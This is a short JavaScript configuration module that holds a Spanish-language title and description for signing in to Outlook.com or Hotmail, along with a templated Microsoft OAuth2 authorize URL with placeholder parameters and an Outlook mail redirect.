export default {
  title: "Iniciar sesión en la cuenta",
  description:
    "Para iniciar sesión en Outlook.com o Hotmail, necesitarás el nombre de usuario y la contraseña de tu cuenta de Microsoft.",
  url: {
    base: "/common/oauth2/v2.0/authorize",
    searchParams:
      "?client_id={uuid}&redirect_uri={encodeURIComponent}&response_type=code%20id_token&scope=openid%20profile%20offline_access&response_mode=form_post&nonce=638346296388632495.{token}&x-client-SKU=ID_NET6_0&x-client-ver=6.30.1.0",
    redirect: "https://outlook.office.com/mail/",
    id: "client_id",
  },
};
